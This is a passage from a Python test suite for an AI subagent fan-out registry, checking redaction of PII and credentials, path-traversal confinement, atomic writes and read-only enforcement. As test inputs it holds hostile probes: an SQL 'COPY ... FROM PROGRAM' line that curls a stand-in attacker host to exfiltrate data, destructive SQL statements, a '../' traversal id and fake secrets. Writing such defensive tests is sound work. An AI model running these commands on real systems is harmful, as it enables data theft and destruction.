    returned only an ``already_complete`` error, so the terminal outcome was
    unrecoverable. The completion response is persisted on the terminal
    record and replayed.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-replay",
        payloads=_mixed_advisory_payloads(),
    )
    results = [
        {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        {"key": "answer_simplifier", "content": "simplifier-advice"},
    ]
    first = submit_fanout_results(
        registry,
        session_id="sess-replay",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert first["status"] == "complete"

    replay = submit_fanout_results(
        registry,
        session_id="sess-replay",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "already_complete"
    assert replay["result"] == first["result"]
    assert replay["missing_optional_keys"] == first["missing_optional_keys"]


def test_data_evidence_pii_shaped_value_is_rejected_at_reentry(tmp_path: Any) -> None:
    """The evidence boundary is enforced at re-entry, without re-leaking.

    Bot-review round-3 probe (PR #1703): a schema-shaped evidence item whose
    value was ``alice@example.com token=sk-live-123`` durably accumulated.
    The boundary scan (aggregates only, PII-scrubbed) now rejects it, and the
    violation report itself never echoes the offending content.
    """
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-boundary",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-boundary", payloads=payloads
    )

    pii_evidence_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Aggregate finding text.",
        "confidence": "reported_by_tool",
        "evidence": [
            {
                "source": "clickhouse_query",
                "query_summary": "count users by plan tier",
                "value": "alice@example.com token=sk-live-123",
                "observed_at": "2026-07-23T09:00:00Z",
                "execution_status": "succeeded",
            }
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time aggregate."],
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-boundary",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": pii_evidence_output},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    violations = out["contract_violations"]
    assert [item["lane_id"] for item in violations] == ["data_context"]
    assert violations[0]["errors"]
    joined = " ".join(violations[0]["errors"])
    assert "alice@example.com" not in joined
    assert "sk-live-123" not in joined
    aggregated = [item["lane_id"] for item in out["result"]["aggregated_outputs"]]
    assert "data_context" not in aggregated
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-123" not in persisted


def test_row_shaped_evidence_value_is_rejected_at_reentry(tmp_path: Any) -> None:
    """Aggregate-only means aggregate-shaped, not just email/token-free.

    Bot-review round-4 probe (PR #1703): a JSON-encoded list of customer
    names and phone numbers passed validation and entered the terminal
    record. Row-shaped values and phone-shaped digit groups are now raw
    evidence.
    """
    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-rows",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-rows", payloads=payloads
    )

    row_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Customer sample follows.",
        "confidence": "reported_by_tool",
        "evidence": [
            {
                "source": "clickhouse_query",
                "query_summary": "sample customers",
                "value": '[{"name": "Alice Kim", "phone": "010-1234-5678"}]',
                "observed_at": "2026-07-23T09:00:00Z",
                "execution_status": "succeeded",
            }
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time sample."],
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-rows",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": row_output},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "Alice Kim" not in persisted
    assert "010-1234-5678" not in persisted


def test_impossible_calendar_date_is_rejected_at_reentry(tmp_path: Any) -> None:
    """A range regex cannot see February 31st; parsing can (round-4 warning)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    impossible = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Aggregate finding.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(source="clickhouse_query", observed_at="2026-02-31T10:00:00Z")
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    errors = _data_evidence_boundary_violations(impossible)
    assert any("observed_at" in error for error in errors)
    valid = {
        **impossible,
        "evidence": [{**impossible["evidence"][0], "observed_at": "2026-02-28T10:00:00Z"}],
    }
    assert _data_evidence_boundary_violations(valid) == []


def test_boundary_scan_allows_hyphenated_vocabulary() -> None:
    """Ordinary data metrics are not credential leaks (round-4 warning).

    ``token-counts`` / ``secret-santa`` previously matched the credential
    pattern; a credential suffix must carry digits.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    clean = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Aggregate token-counts by plan; secret-santa participation is up.",
        "confidence": "reported_by_tool",
        "evidence": [_typed_evidence(source="clickhouse_query", observed_at="2026-07-23")],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    assert _data_evidence_boundary_violations(clean) == []


def test_registration_failure_is_not_advertised(tmp_path: Any) -> None:
    """A fan-out id that cannot be redeemed must never be stamped.

    Bot-review round-4 probe (PR #1703): with ``save`` failing, registration
    still returned a public id whose first re-entry was necessarily
    ``unknown_fanout_id``. Registration now surfaces the failure and the
    producer skips stamping.
    """
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    with patch.object(
        FanoutRegistry, "save", return_value=RecordWrite(written=False, durable=False)
    ):
        assert (
            register_question_advisory_fanout(
                registry,
                session_id="sess-reg-fail",
                payloads=_mixed_advisory_payloads(),
            )
            is None
        )
        meta: dict[str, Any] = {}
        _attach_question_assist_requests(
            meta,
            session_id="sess-reg-fail",
            question="Which rollout strategy should we pick?",
            phase="answer",
            score=None,
            dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
            runtime_backend="codex",
            fanout_registry=registry,
        )
    assert "question_advisory_fanout_id" not in meta


def test_failed_record_update_preserves_prior_state(tmp_path: Any) -> None:
    """A torn write must not destroy the state needed for recovery.

    Bot-review round-4 probe (PR #1703): a mid-write ``OSError`` left the
    live record file as ``{``, so the documented resubmission returned
    ``unknown_fanout_id``. Saves are now atomic (temp file + rename): a
    failed update preserves the prior replayable record.
    """
    import json
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-atomic",
        payloads=_mixed_advisory_payloads(),
    )
    assert fanout_id is not None

    with patch(
        "ouroboros.mcp.tools.subagent.os.replace",
        side_effect=OSError("disk full"),
    ):
        out = submit_fanout_results(
            registry,
            session_id="sess-atomic",
            correlation_key="context.lane_id",
            results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
            fanout_id=fanout_id,
        )
    assert out["status"] == "partial"
    assert out["accumulation_persisted"] is False
    # The prior record is intact JSON and still loadable for the retry.
    json.loads((tmp_path / f"{fanout_id}.json").read_text())
    record = registry.load(fanout_id)
    assert record is not None

    retry = submit_fanout_results(
        registry,
        session_id="sess-atomic",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert retry["status"] == "complete"


def test_terminal_replay_requires_matching_correlation(tmp_path: Any) -> None:
    """Completion recovery must not cross the registered boundary.

    Bot-review round-4 probe (PR #1703): a different session and correlation
    key received ``already_complete`` with the stored synthesis. Correlation
    is now validated before terminal replay.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-replay-boundary",
        payloads=_mixed_advisory_payloads(),
    )
    first = submit_fanout_results(
        registry,
        session_id="sess-replay-boundary",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert first["status"] == "complete"

    cross = submit_fanout_results(
        registry,
        session_id="some-other-session",
        correlation_key="context.persona",
        results=[],
        fanout_id=fanout_id,
    )
    assert cross["status"] == "correlation_mismatch"
    assert "result" not in cross


def test_fanout_id_is_confined_to_registry_root(tmp_path: Any) -> None:
    """A caller-supplied id can never escape the fan-out directory.

    Bot-review round-4 probe (PR #1703): an absolute ``fanout_id`` made
    ``Path`` joining ignore the registry root, loading (and completing) a
    shaped record outside it. Ids are opaque basenames, enforced inside the
    registry independently of outer input validation.
    """
    import json

    root = tmp_path / "root"
    registry = FanoutRegistry(root)
    outside = tmp_path / "outside.json"
    outside.write_text(
        json.dumps(
            {
                "fanout_id": "outside",
                "kind": FANOUT_KIND_QUESTION_ADVISORY,
                "session_id": "s1",
                "correlation_key": "context.lane_id",
                "expected_keys": ["lane"],
                "synthesizer_input": {"lane_ids": ["lane"]},
            }
        )
    )

    absolute_id = str(tmp_path / "outside")
    traversal_id = "../outside"
    assert registry.load(absolute_id) is None
    assert registry.load(traversal_id) is None
    for evil_id in (absolute_id, traversal_id):
        out = submit_fanout_results(
            registry,
            session_id="s1",
            correlation_key="context.lane_id",
            results=[{"key": "lane", "content": "x"}],
            fanout_id=evil_id,
        )
        assert out["status"] == "unknown_fanout_id"
    # Registration refuses a non-basename id instead of writing outside root.
    assert (
        registry.register(
            kind=FANOUT_KIND_QUESTION_ADVISORY,
            session_id="s1",
            correlation_key="context.lane_id",
            expected_keys=["lane"],
            synthesizer_input={"lane_ids": ["lane"]},
            fanout_id=absolute_id,
        )
        is None
    )


def test_mutation_claims_have_no_field_to_live_in() -> None:
    """The read-only boundary is now the SHAPE, not a forbidden-word scan.

    Round-5 probed evidence whose provenance claimed ``DELETE FROM customers``
    and proposals carrying ``UPSERT``/``REPLACE``/``CALL`` query strings. Both
    free-text fields are gone: provenance is a typed ``read_request`` whose
    ``operation`` is a const, so those strings cannot be submitted as a
    request at all, and the mutating-tool identifier rule still guards the
    name of the executed tool.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    mutating_tool = _minimal_data_output()
    mutating_tool["evidence"] = [_typed_evidence(source="delete_customers_tool")]
    assert any(
        "mutating tool" in error and "read-only" in error
        for error in _data_evidence_boundary_violations(mutating_tool)
    )

    for operation in (
        "DELETE FROM customers WHERE stale = 1",
        "UPSERT INTO t VALUES (1)",
        "REPLACE INTO t VALUES (1)",
        "CALL cleanup()",
        "UPDATE users SET tier = 'free'",
        "GRANT ALL ON db TO intern",
        "COPY users FROM PROGRAM 'curl http://attacker/exfil'",
        "SELECT count(nextval('billing_seq')) FROM generate_series(1, 5)",
        "Please delete every customer record",
    ):
        proposal = {
            "lane_id": "data_context",
            "data_needed": True,
            "finding": "Needs a query.",
            "confidence": "inferred",
            "evidence": [],
            "proposed_queries": [
                {
                    "tool_name": "warehouse",
                    "request": operation,
                    "expected_decision": "n/a",
                    "source_class": "external",
                }
            ],
            "requires_user_confirmation": True,
        }
        assert any(
            "typed read request" in error for error in _data_evidence_boundary_violations(proposal)
        ), operation

    # A non-read operation is rejected by the const, whatever it is named.
    non_read = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Needs a query.",
        "confidence": "inferred",
        "evidence": [],
        "proposed_queries": [
            {
                "tool_name": "warehouse",
                "request": {"operation": "write", "metric": "users", "aggregation": "count"},
                "expected_decision": "n/a",
                "source_class": "external",
            }
        ],
        "requires_user_confirmation": True,
    }
    assert any(
        "operation must be 'read'" in error
        for error in _data_evidence_boundary_violations(non_read)
    )


def test_unexpected_key_values_are_redacted_and_not_terminal(tmp_path: Any) -> None:
    """Rejected key VALUES are untrusted content, not identifiers to echo.

    Bot-review round-5 probe (PR #1703): an unexpected key containing an
    email and a token-shaped secret was echoed into ``unexpected_keys`` and
    persisted inside the terminal response. Non-lane-shaped keys are now
    reported as redacted digests, and ``unexpected_keys`` never persists on
    the terminal record.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-redact",
        payloads=_mixed_advisory_payloads(),
    )
    evil_key = "alice@example.com token=sk-live-777"
    out = submit_fanout_results(
        registry,
        session_id="sess-redact",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
            {"key": evil_key, "content": "irrelevant"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert len(out["unexpected_keys"]) == 1
    assert out["unexpected_keys"][0].startswith("<redacted-key sha256:")
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-777" not in persisted
    assert "unexpected_keys" not in persisted


def test_omitted_correlation_does_not_bypass_the_boundary(tmp_path: Any) -> None:
    """Optional parameters are not an escape hatch (round-5 probe).

    A record registered with a session/correlation identity requires the
    caller to present it — omitting both must not allow completion or
    terminal replay.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-strict",
        payloads=_mixed_advisory_payloads(),
    )
    results = [
        {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        {"key": "answer_simplifier", "content": "simplifier-advice"},
    ]
    omitted = submit_fanout_results(
        registry,
        session_id="",
        correlation_key="",
        results=results,
        fanout_id=fanout_id,
    )
    assert omitted["status"] == "correlation_mismatch"

    complete = submit_fanout_results(
        registry,
        session_id="sess-strict",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert complete["status"] == "complete"

    replay_omitted = submit_fanout_results(
        registry,
        session_id="",
        correlation_key="",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay_omitted["status"] == "correlation_mismatch"
    assert "result" not in replay_omitted


def test_surrogate_content_is_rejected_at_the_door(tmp_path: Any) -> None:
    """A lone surrogate must degrade honestly, not crash re-entry (round-5).

    Round-52 strengthens where it degrades: content that cannot be encoded to
    UTF-8 fails the durable write AND the serialization of the failure report
    describing it, so it is rejected as malformed at the door rather than
    reported as a persistence failure that cannot itself cross the transport.
    """
    import json as json_module

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-surrogate",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-surrogate",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "bad " + chr(0xD800) + " surrogate"}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["malformed_keys"] == ["ambiguity_contrarian"]
    json_module.dumps(out, ensure_ascii=False).encode("utf-8")


def test_stale_records_are_swept_on_register(tmp_path: Any) -> None:
    """Completed/orphaned records are retained for a bounded replay window."""
    import os as os_module
    import time

    registry = FanoutRegistry(tmp_path)
    stale_id = register_question_advisory_fanout(
        registry,
        session_id="sess-old",
        payloads=_mixed_advisory_payloads(),
    )
    assert stale_id is not None
    stale_path = tmp_path / f"{stale_id}.json"
    ancient = time.time() - FanoutRegistry._RECORD_RETENTION_SECONDS - 3600
    os_module.utime(stale_path, (ancient, ancient))

    fresh_id = register_question_advisory_fanout(
        registry,
        session_id="sess-new",
        payloads=_mixed_advisory_payloads(),
    )
    assert fresh_id is not None
    assert not stale_path.exists()
    assert (tmp_path / f"{fresh_id}.json").exists()


def _typed_evidence(**overrides: Any) -> dict[str, Any]:
    """One contract-shaped evidence item: a typed read request and aggregate."""
    item: dict[str, Any] = {
        "source": "warehouse",
        "request": {"operation": "read", "metric": "active_users", "aggregation": "count"},
        "value": {"number": 42},
        "observed_at": "2026-07-23T09:00:00Z",
        "execution_status": "succeeded",
    }
    item.update(overrides)
    return item


def _minimal_data_output(prose: str = "Weekly actives grew 12%.") -> dict[str, Any]:
    """A contract-shaped data output whose ADVISORY PROSE is under test.

    Evidence and proposals are typed, so ``finding``/``caveats`` are the only
    free-text surfaces left in the persisted path. These fixtures exercise the
    defense-in-depth scan over that prose.
    """
    return {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": prose,
        "confidence": "reported_by_tool",
        "evidence": [_typed_evidence()],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }


def test_standard_credential_and_pii_forms_are_rejected() -> None:
    """Bot-review round-6 probe: standard credential/PII forms must not pass.

    ``Authorization: Bearer ...``, password assignments, AWS-style keys, and
    parenthesized US phone numbers previously evaded the denylist.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for probe in (
        "Authorization: Bearer abcdef123456",
        "password=abcd1234",
        "AKIAIOSFODNN7EXAMPLE credentials in use",
        "call center at (415) 555-1212",
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(probe)), probe

    for clean in (
        "authorization required for 92% of premium routes",
        "bearer of the top NPS score: free plan at 61 points",
        "password rotation completed for 1,204 accounts",
        "78% of MAU are on the free tier",
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(clean)) == [], clean


def test_concurrent_submissions_terminalize_exactly_once(tmp_path: Any) -> None:
    """Terminalization is concurrency-safe (bot-review round-6 probe).

    Two concurrent full submissions previously both returned ``complete``
    with divergent results. The per-fanout exclusive section serializes them:
    exactly one completes, the other replays the terminal outcome.
    """
    from concurrent.futures import ThreadPoolExecutor

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-concurrent",
        payloads=_mixed_advisory_payloads(),
    )

    def submit(marker: str) -> dict[str, Any]:
        return submit_fanout_results(
            registry,
            session_id="sess-concurrent",
            correlation_key="context.lane_id",
            results=[
                {"key": "ambiguity_contrarian", "content": f"contrarian-{marker}"},
                {"key": "answer_simplifier", "content": f"simplifier-{marker}"},
            ],
            fanout_id=fanout_id,
        )

    with ThreadPoolExecutor(max_workers=2) as pool:
        first, second = pool.map(submit, ["a", "b"])

    statuses = sorted([first["status"], second["status"]])
    assert statuses == ["already_complete", "complete"]
    completed = first if first["status"] == "complete" else second
    replayed = second if first["status"] == "complete" else first
    # The replay carries the SAME terminal outcome — never a divergent one.
    assert replayed["result"] == completed["result"]


def test_corrupt_utf8_record_degrades_cleanly(tmp_path: Any) -> None:
    """A torn/corrupt record returns the documented clean outcome (round-6)."""
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-corrupt",
        payloads=_mixed_advisory_payloads(),
    )
    assert fanout_id is not None
    (tmp_path / f"{fanout_id}.json").write_bytes(b'{"fanout_id": "\xff\xfe broken')

    assert registry.load(fanout_id) is None
    out = submit_fanout_results(
        registry,
        session_id="sess-corrupt",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert out["status"] == "unknown_fanout_id"


def test_known_data_tools_env_is_bounded_and_identifier_validated(monkeypatch: Any) -> None:
    """Env-sourced tool names are identifiers, not prompt text (round-6)."""
    monkeypatch.setenv(
        "OUROBOROS_KNOWN_DATA_TOOLS",
        "clickhouse_query, bad name with spaces, evil\ninjection, " + "x" * 200 + ", metabase",
    )
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-env-bounds",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    assert lanes["data_context"]["known_data_tools"] == ["clickhouse_query", "metabase"]


def test_finalize_false_preserves_late_optional_results(tmp_path: Any) -> None:
    """Sequential hosts do not lose optional lanes to eager completion.

    Bot-review round-7 probe (PR #1703): submitting the documented lane order
    one result at a time completed on the last required lane and bounced the
    late optional lane off ``already_complete``. ``finalize=false``
    accumulates without terminalizing; the closing submission completes with
    every accumulated lane aggregated.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-finalize",
        payloads=_mixed_advisory_payloads(),
    )

    first = submit_fanout_results(
        registry,
        session_id="sess-finalize",
        correlation_key="context.lane_id",
        results=[{"key": "ambiguity_contrarian", "content": "contrarian-advice"}],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert first["status"] == "accumulated"

    # Required set becomes complete here — WITHOUT finalize this would
    # terminalize and discard the optional lane still in flight.
    second = submit_fanout_results(
        registry,
        session_id="sess-finalize",
        correlation_key="context.lane_id",
        results=[{"key": "answer_simplifier", "content": "simplifier-advice"}],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert second["status"] == "accumulated"
    assert second["missing_required_keys"] == []

    conforming_data = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data evidence is needed for this question.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
    }
    closing = submit_fanout_results(
        registry,
        session_id="sess-finalize",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": conforming_data}],
        fanout_id=fanout_id,
        finalize=True,
    )
    assert closing["status"] == "complete"
    aggregated = [item["lane_id"] for item in closing["result"]["aggregated_outputs"]]
    assert aggregated == ["data_context", "ambiguity_contrarian", "answer_simplifier"]
    assert closing["missing_optional_keys"] == []


def test_round7_evidence_boundary_variants_are_rejected() -> None:
    """Bot-review round-7 probes: remaining prohibited-content variants."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for probe in (
        "Alice Kim, premium, 1; Bob Lee, free, 2",
        "Customer SSN 123-45-6789",
        "Authorization: Bearer supersecretvalue",
        'HTTP 200 body: {"ok": false, "detail": "queue stalled"}',
    ):
        assert _data_evidence_boundary_violations(_minimal_data_output(probe)), probe

    # Metric prose with one comma per clause stays valid.
    metric = "revenue up 12%, churn down 3%; retention flat, NPS +4"
    assert _data_evidence_boundary_violations(_minimal_data_output(metric)) == []


def test_gc_never_unlinks_a_held_lock(tmp_path: Any) -> None:
    """Retention GC must not defeat exclusive terminalization (round-7).

    An aged lock file that is currently flock'd is skipped by the sweep; the
    same aged lock is removed once no holder exists.
    """
    import fcntl
    import os as os_module
    import time

    registry = FanoutRegistry(tmp_path)
    lock_path = tmp_path / ".fanout_held.lock"
    lock_path.write_text("")
    ancient = time.time() - FanoutRegistry._RECORD_RETENTION_SECONDS - 3600
    os_module.utime(lock_path, (ancient, ancient))

    fd = os_module.open(lock_path, os_module.O_RDWR)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        registry._gc_stale_records()
        assert lock_path.exists(), "held lock must never be unlinked"
    finally:
        fcntl.flock(fd, fcntl.LOCK_UN)
        os_module.close(fd)

    registry._gc_stale_records()
    assert not lock_path.exists(), "unheld aged lock is swept"


def test_mutating_tool_identifier_in_proposal_is_rejected() -> None:
    """A confirmed proposal is executable payload: its tool NAME matters.

    Bot-review round-8 probe (PR #1703): ``tool_name="delete_database"``
    with an innocuous query completed with no violations. Mutating verbs in
    the tool identifier are now rejected; legitimate read-tool names pass.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    def proposal(tool_name: str) -> dict[str, Any]:
        return {
            "lane_id": "data_context",
            "data_needed": True,
            "finding": "Needs a query.",
            "confidence": "inferred",
            "evidence": [],
            "proposed_queries": [
                {
                    "tool_name": tool_name,
                    "request": {
                        "operation": "read",
                        "metric": "active_users",
                        "aggregation": "count",
                    },
                    "expected_decision": "n/a",
                    "source_class": "side_effect_ambiguous",
                }
            ],
            "requires_user_confirmation": True,
        }

    for mutating in ("delete_database", "drop-table-tool", "upload.results", "SaveReport"):
        errors = _data_evidence_boundary_violations(proposal(mutating))
        assert any("mutating tool" in error for error in errors), mutating

    for read_only in ("clickhouse_query", "metabase_card", "warehouse_reader"):
        assert _data_evidence_boundary_violations(proposal(read_only)) == [], read_only


def test_gc_never_unlinks_a_record_under_active_lock(tmp_path: Any) -> None:
    """Record deletion honors the same per-fanout lock as submission.

    Bot-review round-8 probe (PR #1703): GC deleted an aged JSON record
    while its ``exclusive`` section was held, vaporizing the only durable
    retry state mid-submission.
    """
    import fcntl
    import os as os_module
    import time

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-gc-lock",
        payloads=_mixed_advisory_payloads(),
    )
    assert fanout_id is not None
    record_path = tmp_path / f"{fanout_id}.json"
    ancient = time.time() - FanoutRegistry._RECORD_RETENTION_SECONDS - 3600
    os_module.utime(record_path, (ancient, ancient))

    lock_path = tmp_path / f".{fanout_id}.lock"
    lock_path.touch()
    fd = os_module.open(lock_path, os_module.O_RDWR)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        registry._gc_stale_records()
        assert record_path.exists(), "record under an active lock must survive GC"
    finally:
        fcntl.flock(fd, fcntl.LOCK_UN)
        os_module.close(fd)

    registry._gc_stale_records()
    assert not record_path.exists(), "unlocked aged record is swept"


def test_unknown_lane_answer_contract_reaches_the_child_prompt() -> None:
    """v1 forward compatibility is executable (bot-review round-8).

    An unknown lane carrying an ``answer_contract`` must have that contract
    rendered into its generic child prompt — re-entry validates against it,
    so the generic Output shape alone would guarantee contract_violations.
    """
    request = {
        "session_id": "sess-unknown-contract",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": [
            {
                "lane_id": "future_lane",
                "purpose": "A lane added after this engine shipped.",
                "capability": "future_capability",
                "required": True,
                "answer_contract": {
                    "contract_id": "future_answer.v1",
                    "response_model_schema": {
                        "type": "object",
                        "required": ["lane_id", "verdict"],
                        "properties": {
                            "lane_id": {"const": "future_lane"},
                            "verdict": {"type": "string"},
                        },
                    },
                },
            },
        ],
    }
    payloads = build_interview_question_advisory_subagents(request)
    assert len(payloads) == 1
    prompt = payloads[0].prompt
    assert "future_answer.v1" in prompt
    assert "response_model_schema" in prompt
    assert "generic Output section below is superseded" in prompt


def test_executed_source_is_a_tool_identifier(tmp_path: Any) -> None:
    """``source`` names the executed TOOL, so prose cannot live there.

    Rounds 9 and 11 probed ``delete_database`` and ``delete_database tool``;
    round 45 probed ``delete database tool``, whose bare words evaded the
    compound-token rule. The field's grammar is the fix: an identifier has one
    token, so the mutating-verb check over it is total instead of partial.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for prose in ("delete database tool", "call center logs", "external metered warehouse"):
        output = _minimal_data_output()
        output["evidence"][0]["source"] = prose
        assert any(
            "identifier, not prose" in error for error in _data_evidence_boundary_violations(output)
        ), prose

    for mutating in ("delete_database", "DropTables", "purge_rows.v2"):
        output = _minimal_data_output()
        output["evidence"][0]["source"] = mutating
        assert any(
            "mutating tool" in error for error in _data_evidence_boundary_violations(output)
        ), mutating

    for clean in ("clickhouse_query", "metabase.card.4471", "warehouse"):
        output = _minimal_data_output()
        output["evidence"][0]["source"] = clean
        assert _data_evidence_boundary_violations(output) == [], clean


def test_plugin_recipe_renders_every_lane_contract() -> None:
    """Additive lane contracts ride the plugin child prompt (round-9 probe).

    Re-entry enforces ANY registered contract, so the only prompt the bridge
    delivers must carry every lane's contract — not just data_context's.
    """
    from ouroboros.mcp.tools.subagent import _plugin_advisory_contract_section

    contract = {
        "lanes": [
            {
                "lane_id": "data_context",
                "capability": "call_mcp",
                "required": False,
                "data_policy": {"read_only": True},
                "answer_contract": {
                    "contract_id": "data_evidence_answer.v1",
                    "response_model_schema": {"type": "object"},
                },
            },
            {
                "lane_id": "future_lane",
                "capability": "future_capability",
                "required": True,
                "answer_contract": {
                    "contract_id": "future_answer.v1",
                    "response_model_schema": {"type": "object"},
                },
            },
        ],
    }
    section = _plugin_advisory_contract_section("fanout_abc", contract, "sess-plugin")
    assert "data_evidence_answer.v1" in section
    assert "future_answer.v1" in section
    assert "future_lane answer contract" in section
    assert "session_id: sess-plugin" in section


def test_rows_smuggled_through_prose_fields_are_rejected() -> None:
    """The no-rows policy binds every persisted field (round-10 probe).

    JSON rows placed in ``finding`` previously completed and persisted
    before human confirmation. Prose fields get the field-appropriate row
    check: newlines stay legal in prose, and comma lists stay legal in
    query text.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    rows_in_finding = _minimal_data_output("78% of MAU are on the free tier")
    rows_in_finding["finding"] = 'Sample: [{"name": "Alice Kim", "tier": "premium"}]'
    errors = _data_evidence_boundary_violations(rows_in_finding)
    assert any("finding" in error and "row-shaped" in error for error in errors)

    rows_in_caveat = _minimal_data_output("78% of MAU are on the free tier")
    rows_in_caveat["caveats"] = ['Raw sample: {"user": "Bob Lee"}, {"user": "Choi"}']
    errors = _data_evidence_boundary_violations(rows_in_caveat)
    assert any("caveats[0]" in error for error in errors)

    # Layout separators are what a record table needs, so the field refuses
    # them — a line break or a spaced slash is a table, not a statement.
    for layout in (
        "Most usage is free-tier.\nPremium adoption is growing, slowly.",
        "Alice Smith premium 12 seats / Bob Jones free 8 seats",
        "free 42 | premium 18 | enterprise 3",
    ):
        laid_out = _minimal_data_output()
        laid_out["finding"] = layout
        assert any(
